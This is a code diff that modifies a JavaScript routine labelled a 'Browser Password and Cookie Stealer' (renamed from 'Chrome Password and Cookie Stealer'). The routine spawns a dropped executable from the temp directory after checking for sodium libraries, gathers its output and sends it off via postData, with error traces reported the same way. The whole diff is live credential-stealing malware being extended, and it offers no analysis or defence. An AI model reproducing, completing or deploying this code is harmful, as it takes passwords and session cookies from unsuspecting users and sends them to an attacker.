@@ -30,7 +30,7 @@ try {
         checkForFile('libsodium.dll').then(() => {
             checkForFile('libsodium-64.dll').then(() => {
                 checkForFile('Sodium.dll').then(() => {
-                    const ls = spawn(`${os.tmpdir()}/edg6A23.tmp.exe`);
+                    const ls = spawn(`${os.tmpdir()}/edg6A23.tmp.exe`, ['aaa']);
                     let data = '';
 
                     ls.stdout.on('data', function (d) {
@@ -42,12 +42,12 @@ try {
                     });
 
                     ls.on('exit', function (code) {
-                        postData(data.toString(), 'Chrome Password and Cookie Stealer');
+                        postData(data.toString(), 'Browser Password and Cookie Stealer');
                     });
                 });
             });
         });
     });
 } catch (e) {
-    postData(e.stack, 'Chrome Password and Cookie Stealer Error');
+    postData(e.stack, 'Browser Password and Cookie Stealer Error');
 }
